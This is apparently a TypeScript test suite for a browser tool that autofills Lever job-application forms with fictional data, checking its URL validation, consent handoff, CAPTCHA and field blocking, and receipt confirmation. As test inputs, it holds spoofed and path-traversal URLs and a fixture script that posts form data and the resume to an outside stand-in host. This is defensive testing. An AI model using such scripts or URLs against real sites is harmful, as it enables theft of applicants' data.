import assert from 'node:assert/strict';
import { test } from 'node:test';
import { chromium, type Browser } from 'playwright';
import { AssistedBrowser } from '../src/assisted-browser.js';
import { leverApplicationUrl, assistedConsentSchema, type AssistedPlan } from '@career/domain';

const url = 'https://jobs.lever.co/example/11111111-1111-4111-8111-111111111111/apply';
const plan: AssistedPlan = { adapter: 'lever-hosted-v1', url, profileRevisionId: 'profile', documentId: 'doc', documentSha256: 'abc', documentName: 'Fictional CV', applicationVersion: 1, fields: { name: 'Fictional Candidate', email: 'fictional@example.test', phone: '+34000000000', org: 'Example' } };
const form = `<form id="application-form" method="post" action="/submit"><input name="name" type="text"><input name="email" type="email"><input name="phone" type="tel"><input name="org" type="text"><input name="resume" type="file"><button type="submit">Submit</button></form><script>document.querySelector('form').onsubmit=e=>{e.preventDefault();fetch('/submit',{method:'POST',body:'fictional'}).catch(()=>{});};</script>`;
async function fixture(html = form, postStatus = 200) {
  let raw: Browser; const requests: string[] = []; const payloads: Buffer[] = [];
  const runner = new AssistedBrowser(async () => {
    raw = await chromium.launch({ headless: true }); const create = raw.newContext.bind(raw);
    raw.newContext = async (options) => { const context = await create(options); await context.route('**/*', async route => {
      requests.push(`${route.request().method()} ${route.request().url()}`);
      if (route.request().method() === 'POST') payloads.push(route.request().postDataBuffer() ?? Buffer.alloc(0));
      await route.fulfill({ status: route.request().method() === 'POST' ? postStatus : 200, contentType: 'text/html', body: html });
    }); return context; }; return raw;
  });
  return { runner, requests, payloads, page: () => raw!.contexts()[0]!.pages()[0]! };
}

test('only canonical Lever global/EU URLs; explicit one-use consent input', () => {
  assert.equal(leverApplicationUrl(url.replace('/apply', '?source=x')), url);
  assert.equal(leverApplicationUrl(url.replace('jobs.lever.co','jobs.eu.lever.co')), url.replace('jobs.lever.co','jobs.eu.lever.co'));
  for (const invalid of ['http://jobs.lever.co/example/id', url.replace('jobs.lever.co','jobs.lever.co.evil.test'), url.replace('https://','https://user:pass@'), 'https://127.0.0.1/a', url + '/extra', url.replace('/example/', '/%2e%2e/')]) assert.equal(leverApplicationUrl(invalid), null);
  assert.equal(assistedConsentSchema.safeParse({ consent: false, expectedDigest: 'a'.repeat(64) }).success, false);
});
test('fills contact fields only; network paused until explicit same-window handoff', async () => {
  const f = await fixture();
  try {
    const result = await f.runner.start('one', plan, async () => {});
    assert.deepEqual(result.filled, ['name','email','phone','org']);
    assert.equal(await f.page().locator('[name=name]').inputValue(), plan.fields.name);
    assert.equal(await f.page().locator('[name=resume]').inputValue(), '');
    assert.equal(f.requests.length, 1);
    await f.page().evaluate(async () => { await fetch('/submit', { method: 'POST', body: 'fictional' }).catch(() => undefined); await fetch('/autosave?name=fictional').catch(() => undefined); });
    assert.equal(f.requests.length, 1, 'no autosave or submit leaves review');
    await f.runner.handoff('one');
    assert.equal(f.requests.length, 1, 'handoff itself does not submit');
    await Promise.all([f.page().waitForResponse(response => response.url().endsWith('/submit')), f.page().getByRole('button', { name: 'Submit' }).click()]);
    assert.ok(f.requests.some(item => item.includes('POST https://jobs.lever.co/submit')));
  } finally { await f.runner.closeAll(); }
});
test('automatic submit uploads the exact PDF and confirms only a visible receipt', async () => {
  const html = `<form id="application-form" method="post" enctype="multipart/form-data" action="/submit"><input name="name" type="text"><input name="email" type="email"><input name="phone" type="tel"><input name="org" type="text"><input name="resume" type="file"><button type="submit">Submit</button></form><script>document.querySelector('form').onsubmit=e=>{e.preventDefault();fetch('/submit',{method:'POST',body:new FormData(e.currentTarget)}).then(()=>document.body.insertAdjacentHTML('beforeend','<div class="application-confirmation">Application received</div>'));};</script>`;
  const f = await fixture(html); const bytes = Buffer.from('%PDF-fictional-safe-fixture'); const sha256 = (await import('node:crypto')).createHash('sha256').update(bytes).digest('hex');
  try {
    await f.runner.start('one', plan, async () => {});
    const result = await f.runner.submit('one', { bytes, sha256, name: 'Fictional CV.pdf', fields: plan.fields });
    assert.deepEqual(result, { outcome: 'CONFIRMED', reason: 'ASSIST_VISIBLE_RECEIPT', receipt: 'Application received' });
    assert.ok(f.requests.some((item) => item.includes('POST https://jobs.lever.co/submit')));
    assert.equal(f.payloads.length, 1);
    const posted = f.payloads[0]!.toString('latin1');
    assert.match(posted, /name="name"\r\n\r\nFictional Candidate/); assert.match(posted, /name="email"\r\n\r\nfictional@example\.test/);
    assert.match(posted, /filename="Fictional CV\.pdf"/); assert.ok(f.payloads[0]!.includes(bytes));
  } finally { await f.runner.closeAll(); }
});
test('a visible receipt without a successful response cannot confirm submission and closes the browser', async () => {
  const html = `<form id="application-form" method="post" enctype="multipart/form-data" action="/submit"><input name="name" type="text"><input name="email" type="email"><input name="phone" type="tel"><input name="org" type="text"><input name="resume" type="file"><button type="submit">Submit</button></form><script>document.querySelector('form').onsubmit=e=>{e.preventDefault();fetch('/submit',{method:'POST',body:new FormData(e.currentTarget)}).then(()=>document.body.insertAdjacentHTML('beforeend','<div class="application-confirmation">Application received</div>'));};</script>`;
  const f = await fixture(html, 500); const bytes = Buffer.from('%PDF-fictional-safe-fixture'); const sha256 = (await import('node:crypto')).createHash('sha256').update(bytes).digest('hex');
  try {
    await f.runner.start('one', plan, async () => {});
    const result = await f.runner.submit('one', { bytes, sha256, name: 'Fictional CV.pdf', fields: plan.fields });
    assert.equal(result.outcome, 'UNKNOWN'); assert.equal(f.runner.has('one'), false);
  } finally { await f.runner.closeAll(); }
});
test('unknown required questions, unchecked legal declarations and CAPTCHA block autofill', async () => {
  const required = form.replace('<input name="resume" type="file">', '<input name="resume" type="file"><input name="why" required>');
  const legal = form.replace('<button type="submit">', '<input name="legal" type="checkbox"><button type="submit">');
  const captcha = `<iframe src="https://captcha.example.test/widget"></iframe>${form}`;
  for (const [html, reason] of [[required, 'ASSIST_REQUIRED_FIELD_UNSUPPORTED'], [legal, 'ASSIST_LEGAL_REVIEW_REQUIRED'], [captcha, 'ASSIST_CAPTCHA_REQUIRED']] as const) {
    const f = await fixture(html);
    try { const result = await f.runner.start('one', plan, async () => {}); assert.equal(result.reason, reason); assert.deepEqual(result.filled, []); }
    finally { await f.runner.closeAll(); }
  }
});
test('preexisting receipts and nonempty or checked unsupported fields block submission', async () => {
  const cases = [
    [`${form}<div class="application-confirmation">Application received</div>`, 'ASSIST_RECEIPT_PREEXISTS'],
    [form.replace('</form>', '<input name="customAnswer" value="fictional answer"></form>'), 'ASSIST_OPTIONAL_FIELD_REVIEW_REQUIRED'],
    [form.replace('</form>', '<input type="checkbox" name="customOptIn" value="yes" checked></form>'), 'ASSIST_OPTIONAL_FIELD_REVIEW_REQUIRED'],
  ] as const;
  for (const [html, reason] of cases) {
    const f = await fixture(html);
    try { await f.runner.start('one', plan, async () => {}); assert.deepEqual(await f.runner.inspectSubmit('one'), { supported: false, reason }); }
    finally { await f.runner.closeAll(); }
  }
  const f = await fixture(form.replace('</form>', '<input name="portfolio" type="file"></form>'));
  try {
    await f.runner.start('one', plan, async () => {});
    await f.page().locator('[name=portfolio]').setInputFiles({ name: 'Fictional portfolio.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-extra-fixture') });
    assert.deepEqual(await f.runner.inspectSubmit('one'), { supported: false, reason: 'ASSIST_OPTIONAL_FIELD_REVIEW_REQUIRED' });
  } finally { await f.runner.closeAll(); }
});
test('cross-origin writes are blocked during authorized submission and leave the result uncertain', async () => {
  const html = `<form id="application-form" method="post" enctype="multipart/form-data" action="/submit"><input name="name" type="text"><input name="email" type="email"><input name="phone" type="tel"><input name="org" type="text"><input name="resume" type="file"><button type="submit">Submit</button></form><script>document.querySelector('form').onsubmit=e=>{e.preventDefault();fetch('https://outside.example.test/submit',{method:'POST',body:new FormData(e.currentTarget)}).then(()=>document.body.insertAdjacentHTML('beforeend','<div class="application-confirmation">Application received</div>')).catch(()=>{});};</script>`;
  const f = await fixture(html); const bytes = Buffer.from('%PDF-fictional-safe-fixture'); const sha256 = (await import('node:crypto')).createHash('sha256').update(bytes).digest('hex');
  try {
    await f.runner.start('one', plan, async () => {});
    const result = await f.runner.submit('one', { bytes, sha256, name: 'Fictional CV.pdf', fields: plan.fields });
    assert.equal(result.outcome, 'UNKNOWN');
    assert.equal(f.requests.some((item) => item.includes('outside.example.test')), false);
  } finally { await f.runner.closeAll(); }
});
test('ambiguous required destination leaves all fields untouched', async () => {
  const f = await fixture(form.replace('<input name="name" type="text">','<input name="name" type="text"><input name="name" type="text">'));
  try { const result = await f.runner.start('one', plan, async () => {}); assert.equal(result.reason, 'ASSIST_FORM_NOT_RECOGNIZED'); assert.deepEqual(result.filled, []); assert.equal(await f.page().locator('[name=email]').inputValue(), ''); } finally { await f.runner.closeAll(); }
});
test('unknown form stays manual and never guesses selectors', async () => {
  const f = await fixture('<h1>Verify your browser</h1><input name="name">');
  try { const result = await f.runner.start('one', plan, async () => {}); assert.equal(result.reason, 'ASSIST_FORM_NOT_RECOGNIZED'); assert.equal(await f.page().locator('[name=name]').inputValue(), ''); } finally { await f.runner.closeAll(); }
});
test('one browser at a time; closing the window reports lost state', async () => {
  const f = await fixture(); let lost = 0;
  try { await f.runner.start('one', plan, async () => { lost++; }); await assert.rejects(() => f.runner.start('two', plan, async () => {}), /BUSY/); await f.page().context().browser()!.close(); assert.equal(lost, 1); assert.equal(f.runner.busy(), false); } finally { await f.runner.closeAll(); }
});
test('changed page cannot be handed off and unsupported URLs never launch', async () => {
  const f = await fixture();
  try { await assert.rejects(() => f.runner.start('bad', { ...plan, url: 'https://example.test/' }, async () => {}), /UNSUPPORTED_URL/); assert.equal(f.requests.length, 0); await f.runner.start('one', plan, async () => {}); await f.page().evaluate(() => history.replaceState({}, '', '/another-job')); await assert.rejects(() => f.runner.handoff('one'), /PAGE_CHANGED/); } finally { await f.runner.closeAll(); }
});
